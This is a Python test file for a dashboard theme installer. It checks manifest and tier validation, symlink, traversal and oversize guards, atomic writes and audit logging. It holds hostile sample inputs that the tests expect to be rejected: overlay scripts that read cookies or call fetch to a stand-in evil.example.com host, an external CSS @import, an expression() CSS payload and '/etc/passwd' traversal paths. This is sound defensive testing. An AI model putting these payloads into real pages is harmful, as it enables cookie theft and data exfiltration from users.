"""Tests for theme install (directory store + tier-aware validation, L0/L1/L2).

Exercises the pure helpers in ``kiro_crew.dashboard.theme_validate`` and the
theme HTTP handlers in ``kiro_crew.dashboard.handlers.themes`` (plus the
persona reader in ``chat_utils``) directly — the validator is where the real
structure/security logic lives, so no aiohttp app is needed. Covers:

* L0: valid installs (top-level + styles/), missing/invalid manifest, level
  bounds (L0 declaring-but-shipping-L2), stray files, VCS/meta tolerance,
  symlink rejection, oversize, bad CSS values.
* L1: valid branding/fonts/overrides.css install; overrides.css denylist
  (@import / external url() / forbidden selector); font count cap; a font/
  branding asset in an L0 theme rejected.
* L2: valid overlays/topbar/audio/persona install; overlay/topbar HTML denylist
  (external <script src> / cookie / localStorage / fetch-URL); overlay count
  cap; persona bounds (length + mandatory drop-persona & security clauses);
  audio magic-byte sniff; per-file size cap; an L2 asset in an L1 theme rejected.
* Pure content helpers (_sniff_audio / _classify_theme_file /
  _validate_overrides_css / _validate_overlay_html / _validate_persona).
* Asset routes: _resolve_theme_asset containment/traversal/symlink guards.
* Persona injection: _installed_theme_persona slug/symlink/cap guards.
* The GitHub URL guard, recognized-file staging, copy-overwrite/re-install, and
  an install→list→remove round-trip.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from kiro_crew.dashboard.handlers.themes import (
    _atomic_write_theme_json,
    _clone_github,
    _copy_installed_theme,
)
from kiro_crew.dashboard.theme_validate import (
    _THEME_OVERLAY_DEFAULT_POSITION,
    _THEME_OVERLAY_DEFAULT_ZINDEX,
    _classify_theme_file,
    _installed_theme_dir,
    _overrides_layout_violation,
    _resolve_theme_asset,
    _safe_theme_slug,
    _sniff_audio,
    _theme_asset_descriptor,
    _validate_audio_manifest,
    _validate_overlay_decls,
    _validate_overlay_html,
    _validate_overrides_css,
    _validate_persona,
    _validate_theme_dir,
    _validate_topbar_decls,
)

# _validate_theme_data only *requires* --bg/--text/--accent and rejects unknown
# keys, so a 3-var map per mode is a complete, valid Level-0 theme.
_VALID_VARS = {
    "dark": {"--bg": "#000000", "--text": "#ffffff", "--accent": "#3366ff"},
    "light": {"--bg": "#ffffff", "--text": "#000000", "--accent": "#0033cc"},
}


def _write(path: Path, obj: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(obj), encoding="utf-8")


def _make_theme(
    root: Path,
    *,
    level: int = 0,
    name: str = "LCARS",
    styled: bool = False,
    variables: dict | None = None,
) -> Path:
    """Build a theme directory under ``root`` and return its path."""
    d = root / "theme"
    d.mkdir(parents=True, exist_ok=True)
    _write(
        d / "theme.json",
        {"slug": "lcars", "name": name, "emoji": "🖖", "level": level, "formatVersion": 1},
    )
    varobj = _VALID_VARS if variables is None else variables
    _write(d / ("styles/variables.json" if styled else "variables.json"), varobj)
    return d


# A valid persona: within the length cap AND carries both mandatory clauses
# (an explicit "drop persona on request" and a "security/accuracy overrides").
_VALID_PERSONA = (
    "You narrate like a retro starship computer. Drop this persona immediately "
    "whenever the user asks. Security and accuracy always override the persona."
)
# A minimal but valid MP3 header (ID3 or MPEG frame sync) for the audio sniff.
_VALID_MP3 = b"\xff\xfb\x90\x00" + b"\x00" * 64


def _make_tiered(
    root: Path,
    *,
    level: int,
    extra: dict[str, object] | None = None,
    slug: str | None = None,
) -> Path:
    """Build a Level 1/2 theme directory; ``extra`` maps rel-path -> str|bytes."""
    d = root / f"theme-l{level}"
    d.mkdir(parents=True, exist_ok=True)
    _write(
        d / "theme.json",
        {
            "slug": slug or f"pack-l{level}",
            "name": f"Pack L{level}",
            "emoji": "🎨",
            "level": level,
            "formatVersion": 1,
        },
    )
    _write(d / "variables.json", _VALID_VARS)
    for rel, content in (extra or {}).items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            p.write_bytes(content)
        else:
            p.write_text(str(content), encoding="utf-8")
    return d


# Recognized L1 asset payload (branding + a font + a clean overrides.css).
_L1_ASSETS: dict[str, object] = {
    "branding/logo.svg": "<svg xmlns='http://www.w3.org/2000/svg'></svg>",
    "styles/fonts/display.woff2": b"wOF2" + b"\x00" * 32,
    "styles/overrides.css": ".chat-bubble { border-radius: 8px; }",
}
# Recognized L2 asset payload (overlay + both topbars + audio + persona).
_L2_ASSETS: dict[str, object] = {
    "overlays/scanner.html": "<div class='scan'>scanning</div>",
    "topbar/dark.html": "<div>dark bar</div>",
    "topbar/light.html": "<div>light bar</div>",
    "audio/beep.mp3": _VALID_MP3,
    "persona.md": _VALID_PERSONA,
}


def _make_full_l2(root: Path, *, slug: str = "fixture-l2") -> Path:
    """Build a full Level-2 pack in a tmp dir: persona + overlay + both topbars
    + a font + clean overrides.css + an audio manifest, with the §3.1/§3.3
    ``overlays``/``topbar`` manifest declarations populated. This replaces the
    old shipped-sample regression — sample/test packs no longer live in the
    repo (nothing theme-bearing ships in the wheel), so the full-L2 regression
    value (validates at L2, survives the copy path + re-install, exposes a
    content-bound persona descriptor) is exercised entirely from a fixture."""
    d = root / slug
    d.mkdir(parents=True, exist_ok=True)
    _write(
        d / "theme.json",
        {
            "slug": slug,
            "name": "Fixture L2",
            "emoji": "🎨",
            "level": 2,
            "formatVersion": 1,
            "overlays": [{"id": "scanner", "src": "overlays/scanner.html"}],
            "topbar": {"dark": "topbar/dark.html", "light": "topbar/light.html"},
        },
    )
    _write(d / "variables.json", _VALID_VARS)
    (d / "persona.md").write_text(_VALID_PERSONA, encoding="utf-8")
    (d / "overlays").mkdir()
    (d / "overlays" / "scanner.html").write_text(
        "<div class='scan'>scanning</div>", encoding="utf-8"
    )
    (d / "topbar").mkdir()
    (d / "topbar" / "dark.html").write_text("<div>dark bar</div>", encoding="utf-8")
    (d / "topbar" / "light.html").write_text("<div>light bar</div>", encoding="utf-8")
    (d / "styles" / "fonts").mkdir(parents=True)
    (d / "styles" / "fonts" / "display.woff2").write_bytes(b"wOF2" + b"\x00" * 32)
    (d / "styles" / "overrides.css").write_text(
        ".chat-bubble { border-radius: 8px; }", encoding="utf-8"
    )
    (d / "audio").mkdir()
    (d / "audio" / "chime.mp3").write_bytes(_VALID_MP3)
    _write(
        d / "audio" / "manifest.json",
        {"triggers": {"notification": {"src": "audio/chime.mp3", "volume": 0.5, "maxDuration": 2}}},
    )
    return d


class TestValidateThemeDir:
    def test_valid_toplevel(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_theme(tmp_path))
        assert err is None, err
        assert summary is not None
        assert summary["slug"] == "lcars"
        assert summary["name"] == "LCARS"
        assert summary["emoji"] == "🖖"
        assert summary["level"] == 0
        assert summary["source"] == "installed"
        assert summary["dark"]["--bg"] == "#000000"
        assert summary["light"]["--text"] == "#000000"

    def test_valid_styles_subdir(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_theme(tmp_path, styled=True))
        assert err is None, err
        assert summary is not None and summary["slug"] == "lcars"

    def test_missing_manifest(self, tmp_path: Path) -> None:
        d = tmp_path / "t"
        _write(d / "variables.json", _VALID_VARS)
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "theme.json" in err

    def test_missing_variables(self, tmp_path: Path) -> None:
        d = tmp_path / "t"
        _write(d / "theme.json", {"slug": "x", "name": "X", "level": 0, "formatVersion": 1})
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "variables.json" in err

    def test_level_above_max_rejected(self, tmp_path: Path) -> None:
        # Levels 0–2 are all valid now (tier feature); only a level ABOVE
        # _THEME_MAX_LEVEL is rejected. A level-2 manifest with no higher-tier
        # assets is accepted.
        summary, err = _validate_theme_dir(_make_theme(tmp_path / "hi", level=3))
        assert summary is None
        assert err is not None and "0, 1, or 2" in err
        summary, err = _validate_theme_dir(_make_theme(tmp_path / "ok", level=2))
        assert err is None, err
        assert summary is not None and summary["level"] == 2

    def test_l2_overlay_asset_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)  # declares level 0 but ships an overlay
        (d / "overlays").mkdir()
        (d / "overlays" / "scanner.html").write_text("<b>x</b>", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "level 2" in err.lower()

    def test_persona_asset_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / "persona.md").write_text("# persona", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "level 2" in err.lower()

    def test_stray_file_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / "evil.txt").write_text("x", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "unexpected file" in err

    def test_meta_files_tolerated(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / ".gitignore").write_text("x", encoding="utf-8")
        (d / "LICENSE").write_text("MIT", encoding="utf-8")
        gitdir = d / ".git"
        gitdir.mkdir()
        (gitdir / "config").write_text("[core]", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert err is None, err
        assert summary is not None and summary["slug"] == "lcars"

    def test_symlink_rejected(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        outside = tmp_path / "outside.json"
        outside.write_text("{}", encoding="utf-8")
        try:
            (d / "readme.md").symlink_to(outside)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "symlink" in err.lower()

    def test_bad_css_value_rejected(self, tmp_path: Path) -> None:
        bad = {
            "dark": {"--bg": "red; }", "--text": "#fff", "--accent": "#00f"},
            "light": {"--bg": "#fff", "--text": "#000", "--accent": "#00c"},
        }
        summary, err = _validate_theme_dir(_make_theme(tmp_path, variables=bad))
        assert summary is None
        assert err is not None  # rejected by _validate_theme_data

    def test_oversize_variables_rejected(self, tmp_path: Path) -> None:
        d = tmp_path / "t"
        _write(d / "theme.json", {"slug": "x", "name": "X", "level": 0, "formatVersion": 1})
        padded = dict(_VALID_VARS)
        padded["_pad"] = "x" * (70 * 1024)  # push variables.json past 64KB
        _write(d / "variables.json", padded)
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "too large" in err


class TestFormatVersion:
    """theme.json ``formatVersion`` gate (arbiter item 1). Checked before any
    other schema error, so a forward-incompatible pack gets an honest 'needs a
    newer KiroCrew' message rather than an opaque downstream error."""

    def _fmt_theme(self, tmp_path: Path, fmt: object, *, omit: bool = False) -> Path:
        # _make_theme already writes a valid formatVersion:1 manifest; overwrite
        # theme.json with the value under test (or omit the key entirely).
        d = _make_theme(tmp_path)
        manifest: dict[str, object] = {"slug": "lcars", "name": "LCARS", "emoji": "🖖", "level": 0}
        if not omit:
            manifest["formatVersion"] = fmt
        _write(d / "theme.json", manifest)
        return d

    def test_format_version_1_passes(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, 1))
        assert err is None, err
        assert summary is not None and summary["slug"] == "lcars"

    def test_missing_format_version_rejected(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, None, omit=True))
        assert summary is None
        assert err is not None and 'must declare "formatVersion"' in err

    def test_newer_format_version_rejected(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, 2))
        assert summary is None
        assert err is not None
        assert "requires a newer version of KiroCrew" in err
        assert "formatVersion 2" in err and "supported 1" in err

    @pytest.mark.parametrize("bad", ["1", 1.5, None, True])
    def test_non_int_format_version_rejected(self, tmp_path: Path, bad: object) -> None:
        # A string, float, null, or bool is not an integer -> the declare-message
        # (checked before the level/name/variables schema).
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, bad))
        assert summary is None
        assert err is not None and 'must declare "formatVersion"' in err

    def test_below_one_rejected(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(self._fmt_theme(tmp_path, 0))
        assert summary is None
        assert err is not None and "positive integer" in err


class TestSafeThemeSlug:
    def test_valid_slug(self) -> None:
        assert _safe_theme_slug("lcars-01") == "lcars-01"

    @pytest.mark.parametrize("bad", ["../etc", "a/b", "", "Foo", "a.b", "x y"])
    def test_unsafe_rejected(self, bad: str) -> None:
        assert _safe_theme_slug(bad) is None


class TestCloneGithubGuard:
    """The URL guard runs before any subprocess — no network/git required."""

    def test_non_https_rejected(self, tmp_path: Path) -> None:
        err = _clone_github("http://github.com/u/r", tmp_path / "c")
        assert err is not None and "https" in err

    def test_non_github_host_rejected(self, tmp_path: Path) -> None:
        err = _clone_github("https://evil.example.com/u/r", tmp_path / "c")
        # Assert on the rejection phrase, not a bare domain substring
        # (CodeQL flags `"github.com" in x` as URL-substring sanitization).
        assert err is not None and "only https" in err

    def test_empty_url_rejected(self, tmp_path: Path) -> None:
        assert _clone_github("", tmp_path / "c") is not None


class TestAtomicWriteThemeJson:
    """Guards the create/update TOCTOU fix: writes go through a temp file +
    os.replace so a concurrent same-slug writer can never observe a torn file,
    and a failed write leaves neither a partial target nor a leftover temp."""

    def test_writes_valid_json_no_temp_left(self, tmp_path: Path) -> None:
        target = tmp_path / "sunset.json"
        _atomic_write_theme_json(target, json.dumps({"slug": "sunset"}) + "\n")
        assert json.loads(target.read_text("utf-8")) == {"slug": "sunset"}
        # No leftover ".sunset-*.tmp" scratch files in the directory.
        assert list(tmp_path.glob(".sunset-*.tmp")) == []

    def test_overwrite_is_atomic_and_complete(self, tmp_path: Path) -> None:
        target = tmp_path / "sunset.json"
        _atomic_write_theme_json(target, json.dumps({"v": 1}) + "\n")
        _atomic_write_theme_json(target, json.dumps({"v": 2}) + "\n")
        # os.replace overwrites in place — the new complete content wins, and
        # exactly one file exists (no torn half-write, no temp residue).
        assert json.loads(target.read_text("utf-8")) == {"v": 2}
        assert list(tmp_path.glob(".sunset-*.tmp")) == []

    def test_failed_write_leaves_no_partial_or_temp(self, tmp_path: Path) -> None:
        target = tmp_path / "sunset.json"
        # A non-str payload makes the text-mode write raise mid-helper (after
        # mkstemp, before os.replace) — the except path must unlink the temp and
        # leave the target absent (never a partial file).
        with pytest.raises(TypeError):
            _atomic_write_theme_json(target, 123)  # type: ignore[arg-type]
        assert not target.exists()
        assert list(tmp_path.glob(".sunset-*.tmp")) == []


class TestThemeInstallGovernanceAudit:
    """The theme-install admission decision must land in the SEL audit trail for
    BOTH the allowed and denied outcomes, and the audit must never wedge install."""

    def test_allowed_and_denied_emit_sel(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.sel as sel_mod
        from kiro_crew.dashboard.handlers import themes as th

        calls: list[dict] = []

        class _Recorder:
            def log_governance_decision(self, **kw: object) -> None:
                calls.append(kw)

        monkeypatch.setattr(sel_mod, "sel", lambda: _Recorder())

        class _Decision:
            permitted = False
            rule = "capabilities.theme_install"
            layer = "policy"
            reason = "disabled by enterprise policy"

        th._audit_theme_install_governance("allowed", _Decision())
        th._audit_theme_install_governance("denied", _Decision())

        assert [c["outcome"] for c in calls] == ["allowed", "denied"]
        assert calls[0]["scope"] == "capabilities.theme_install"
        assert calls[0]["tool_name"] == "api_themes_install"
        assert calls[1]["reason"] == "disabled by enterprise policy"

    def test_never_raises_when_sel_unavailable(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.sel as sel_mod
        from kiro_crew.dashboard.handlers import themes as th

        def _boom() -> object:
            raise RuntimeError("sel backend down")

        monkeypatch.setattr(sel_mod, "sel", _boom)
        # decision=None (governance-unavailable path) + broken SEL must be silent.
        th._audit_theme_install_governance("denied", None, reason="governance unavailable")


class TestCopyInstalledTheme:
    def test_copies_only_recognized_files(self, tmp_path: Path) -> None:
        d = _make_theme(tmp_path)
        (d / "LICENSE").write_text("MIT", encoding="utf-8")
        dst = tmp_path / "dst"
        _copy_installed_theme(d, dst)
        assert (dst / "theme.json").is_file()
        assert (dst / "variables.json").is_file()
        assert not (dst / "LICENSE").exists()

    def test_preserves_styles_location(self, tmp_path: Path) -> None:
        dst = tmp_path / "dst"
        _copy_installed_theme(_make_theme(tmp_path, styled=True), dst)
        assert (dst / "styles" / "variables.json").is_file()

    def test_symlinked_file_rejected(self, tmp_path: Path) -> None:
        # TOCTOU (Codex HIGH): a file swapped for a symlink after validation must
        # be REFUSED by the copy loop, never dereferenced+served. The old
        # copytree(symlinks=False) would have copied the target's bytes.
        secret = tmp_path / "secret.txt"
        secret.write_text("TOP SECRET", encoding="utf-8")
        d = _make_theme(tmp_path)
        try:
            (d / "readme.md").symlink_to(secret)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        dst = tmp_path / "dst"
        with pytest.raises(ValueError):
            _copy_installed_theme(d, dst)
        # Nothing from the symlink target leaked into the staging tree.
        assert not (dst / "readme.md").exists()

    def test_symlinked_dir_rejected(self, tmp_path: Path) -> None:
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "leak.txt").write_text("x", encoding="utf-8")
        d = _make_theme(tmp_path)
        try:
            (d / "branding").symlink_to(outside, target_is_directory=True)
        except (OSError, NotImplementedError):
            pytest.skip("symlinks unsupported on this platform")
        with pytest.raises(ValueError):
            _copy_installed_theme(d, tmp_path / "dst")

    def test_full_l2_pack_survives_copy_path(self, tmp_path: Path) -> None:
        # A full L2 pack (persona + overlays + topbar + fonts + audio manifest)
        # built in a tmp dir installs cleanly through the symlink-rejecting copy
        # loop, and re-install overwrites in place (no false positives). Replaces
        # the old shipped-sample regression now that packs live outside the repo.
        src = _make_full_l2(tmp_path / "src")
        dst = tmp_path / "dst"
        _copy_installed_theme(src, dst)
        assert (dst / "theme.json").is_file()
        assert (dst / "persona.md").is_file()
        # Re-copy overwrites the same slug without error (re-install path).
        _copy_installed_theme(src, dst)
        assert (dst / "theme.json").is_file()

    def test_oversized_source_rejected_by_copy_budget(self, tmp_path: Path) -> None:
        # TOCTOU round 2 (Codex HIGH): a regular file swapped for a huge one
        # after any earlier walk must not exhaust memory / land in staging —
        # the copy loop enforces a hard cumulative byte ceiling itself.
        from kiro_crew.dashboard.theme_validate import _THEME_TOTAL_BYTES_BY_LEVEL

        budget = max(_THEME_TOTAL_BYTES_BY_LEVEL.values())
        d = _make_theme(tmp_path)
        (d / "branding").mkdir(exist_ok=True)
        with (d / "branding" / "logo.png").open("wb") as f:
            f.seek(budget + 1)
            f.write(b"\0")
        dst = tmp_path / "dst"
        with pytest.raises(ValueError, match="maximum install size"):
            _copy_installed_theme(d, dst)
        assert not (dst / "branding" / "logo.png").exists()

    def test_source_containing_themes_dir_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Codex HIGH round 3: staging lives inside _themes_dir(), so a source
        # equal to (or an ancestor of) the themes dir would make the copy walk
        # recursively consume its own staging output (unbounded nesting →
        # ENAMETOOLONG → residue). Must 400 by containment, leaving no residue.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        themes_root = tv_mod._themes_dir()
        themes_root.mkdir(parents=True, exist_ok=True)
        for bad in (tmp_path / "cfg", themes_root):
            theme, err, status = th_mod._do_install("local", {"path": str(bad)})
            assert theme is None and status == 400, (bad, err, status)
            assert not any(p.name.startswith(".install-staging-") for p in themes_root.iterdir())

    def test_install_validates_the_staging_snapshot_not_the_source(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # TOCTOU round 2 (Codex HIGH): validation must run on the private
        # staging copy (immutable to an attacker), NOT on the still-writable
        # source dir — otherwise content swapped in after validation gets
        # promoted unvalidated. Pin the order by capturing the path
        # _validate_theme_dir receives during a real _do_install.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path / "cfg")
        src = _make_theme(tmp_path)
        seen: list[Path] = []
        real_validate = th_mod._validate_theme_dir

        def _spy(path: Path):  # type: ignore[no-untyped-def]
            seen.append(Path(path))
            return real_validate(path)

        monkeypatch.setattr(th_mod, "_validate_theme_dir", _spy)
        theme, err, status = th_mod._do_install("local", {"path": str(src)})
        assert err is None and status == 200 and theme is not None
        assert len(seen) == 1
        # Validated path is the staging snapshot inside the themes dir —
        # never the caller-supplied source.
        assert seen[0] != src
        assert seen[0].name.startswith(".install-staging-")
        # The promoted install came from that snapshot.
        assert (tmp_path / "cfg" / "themes" / theme["slug"] / "theme.json").is_file()


class TestInstalledStore:
    def test_dir_under_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        assert _installed_theme_dir("lcars") == tmp_path / "themes" / "lcars"

    def test_install_copy_and_remove_roundtrip(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        src = _make_theme(tmp_path)
        summary, err = _validate_theme_dir(src)
        assert err is None and summary is not None

        dest = _installed_theme_dir(summary["slug"])
        _copy_installed_theme(src, dest)
        assert (dest / "theme.json").is_file()
        assert dest.is_dir()

        # Remove de-registers (matches the DELETE handler's rmtree path).
        shutil.rmtree(dest)
        assert not dest.exists()

    def test_install_rejects_slug_colliding_with_editor_record(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Duplicate-slug guard (now checked INSIDE the per-slug lock, right
        # before promotion): if an editor custom record <slug>.json already
        # exists, installing a dir with the same slug must 409 and leave no
        # staging residue — never both a .json record and a <slug>/ dir.
        import kiro_crew.dashboard.handlers.themes as th_mod
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        src = _make_theme(tmp_path)
        summary, err = _validate_theme_dir(src)
        assert err is None and summary is not None
        slug = summary["slug"]
        themes_dir = tmp_path / "themes"
        themes_dir.mkdir(parents=True, exist_ok=True)
        (themes_dir / f"{slug}.json").write_text("{}", encoding="utf-8")

        theme, err2, status = th_mod._do_install("local", {"path": str(src)})
        assert theme is None and status == 409
        assert "already exists" in (err2 or "")
        # No staging snapshot left behind, the editor record survives, and no
        # duplicate <slug>/ dir was promoted.
        assert list(themes_dir.glob(".install-staging-*")) == []
        assert (themes_dir / f"{slug}.json").is_file()
        assert not (themes_dir / slug).exists()


class TestValidateThemeDirL1:
    def test_valid_l1(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=_L1_ASSETS))
        assert err is None, err
        assert summary is not None
        assert summary["level"] == 1
        assert summary["slug"] == "pack-l1"

    def test_overrides_external_import_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L1_ASSETS)
        assets["styles/overrides.css"] = "@import url('https://evil.example.com/x.css');"
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "forbidden pattern" in err

    def test_overrides_forbidden_selector_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L1_ASSETS)
        assets["styles/overrides.css"] = "iframe { display: none; }"
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "forbidden selector" in err

    def test_too_many_fonts_rejected(self, tmp_path: Path) -> None:
        assets = {f"styles/fonts/f{i}.woff2": b"wOF2" + b"\x00" * 8 for i in range(4)}
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "too many fonts" in err

    def test_l1_asset_in_l0_theme_rejected(self, tmp_path: Path) -> None:
        # An L0 theme shipping a branding logo must be rejected on the level gate.
        d = _make_theme(tmp_path)
        (d / "branding").mkdir()
        (d / "branding" / "logo.svg").write_text("<svg></svg>", encoding="utf-8")
        summary, err = _validate_theme_dir(d)
        assert summary is None
        assert err is not None and "level 1" in err.lower()


class TestValidateThemeDirL2:
    def test_valid_l2(self, tmp_path: Path) -> None:
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=_L2_ASSETS))
        assert err is None, err
        assert summary is not None and summary["level"] == 2

    @pytest.mark.parametrize(
        "html",
        [
            "<script src='https://evil.example.com/x.js'></script>",
            "<div>x</div><script>document.cookie</script>",
            "<script>localStorage.getItem('k')</script>",
            "<script>fetch('https://evil.example.com/steal')</script>",
        ],
    )
    def test_overlay_html_denylist(self, tmp_path: Path, html: str) -> None:
        assets = dict(_L2_ASSETS)
        assets["overlays/scanner.html"] = html
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "forbidden pattern" in err

    def test_too_many_overlays_rejected(self, tmp_path: Path) -> None:
        assets = {f"overlays/o{i}.html": "<div>x</div>" for i in range(6)}
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "too many overlays" in err

    def test_persona_too_long_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["persona.md"] = "x" * 2001
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "too long" in err

    def test_persona_missing_drop_clause_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["persona.md"] = "You are a cheerful assistant. Security overrides everything."
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "drop" in err.lower()

    def test_persona_missing_security_clause_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["persona.md"] = "You are a pirate. Drop this persona whenever the user asks."
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "override" in err.lower()

    def test_audio_bad_magic_rejected(self, tmp_path: Path) -> None:
        assets = dict(_L2_ASSETS)
        assets["audio/beep.mp3"] = b"NOTAUDIO" + b"\x00" * 16
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=2, extra=assets))
        assert summary is None
        assert err is not None and "valid audio" in err


class TestLevelBounds:
    def test_l2_asset_in_l1_theme_rejected(self, tmp_path: Path) -> None:
        # An L1 theme carrying an overlays/ dir trips the directory level gate.
        assets = dict(_L1_ASSETS)
        assets["overlays/scanner.html"] = "<div>x</div>"
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "level 2" in err.lower()

    def test_per_file_size_cap_rejected(self, tmp_path: Path) -> None:
        # overrides.css cap is 100 KiB; 101 KiB of inert text trips the size cap.
        assets = dict(_L1_ASSETS)
        assets["styles/overrides.css"] = "a" * (101 * 1024)
        summary, err = _validate_theme_dir(_make_tiered(tmp_path, level=1, extra=assets))
        assert summary is None
        assert err is not None and "too large" in err


class TestPureContentHelpers:
    @pytest.mark.parametrize(
        "head",
        [b"ID3\x04\x00\x00\x00", b"\xff\xfb\x90\x00", b"OggS\x00\x02", b"RIFF\x00\x00\x00\x00WAVE"],
    )
    def test_sniff_audio_accepts_known(self, head: bytes) -> None:
        assert _sniff_audio(head) is True

    @pytest.mark.parametrize("head", [b"", b"ab", b"NOTAUDIO", b"%PDF"])
    def test_sniff_audio_rejects_others(self, head: bytes) -> None:
        assert _sniff_audio(head) is False

    @pytest.mark.parametrize(
        "rel,category,min_level",
        [
            ("theme.json", "manifest", 0),
            ("variables.json", "variables", 0),
            ("styles/overrides.css", "overrides", 1),
            ("styles/fonts/x.woff2", "font", 1),
            ("branding/logo.svg", "logo", 1),
            ("overlays/scanner.html", "overlay", 2),
            ("topbar/dark.html", "topbar", 2),
            ("audio/beep.mp3", "audio", 2),
            ("audio/ambient.ogg", "audio_ambient", 2),
            ("persona.md", "persona", 2),
        ],
    )
    def test_classify_known(self, rel: str, category: str, min_level: int) -> None:
        assert _classify_theme_file(rel) == (category, min_level)

    @pytest.mark.parametrize("rel", ["evil.txt", "styles/x.js", "branding/logo.gif", "random/x"])
    def test_classify_unknown(self, rel: str) -> None:
        assert _classify_theme_file(rel) == (None, 0)

    def test_overrides_css_clean_ok(self) -> None:
        assert _validate_overrides_css(".chat { color: var(--accent); }") is None

    def test_overrides_css_expression_rejected(self) -> None:
        assert _validate_overrides_css("x { width: expression(alert(1)); }") is not None

    def test_overlay_html_clean_ok(self) -> None:
        assert _validate_overlay_html("<div>hi</div><style>.a{}</style>", "x.html") is None

    def test_overlay_html_cookie_rejected(self) -> None:
        assert _validate_overlay_html("<script>document.cookie</script>", "x.html") is not None

    def test_persona_valid_ok(self) -> None:
        assert _validate_persona(_VALID_PERSONA) is None


class TestResolveThemeAsset:
    def _install(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        import kiro_crew.dashboard.theme_validate as tv_mod

        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        theme = _installed_theme_dir("mytheme")
        (theme / "branding").mkdir(parents=True)
        (theme / "branding" / "logo.svg").write_text("<svg></svg>", encoding="utf-8")
        return theme

    def test_valid_asset_resolves(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        theme = self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("mytheme", "branding/logo.svg")
        assert err is None
        assert target == (theme / "branding" / "logo.svg").resolve()

    @pytest.mark.parametrize("sub", ["../../../etc/passwd", "branding/../../escape", "/etc/passwd"])
    def test_traversal_rejected(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sub: str
    ) -> None:
        self._install(tmp_path, monkeypatch)
        target, err = _resolve_theme_asset("mytheme", sub)
        assert target is None and err is not None

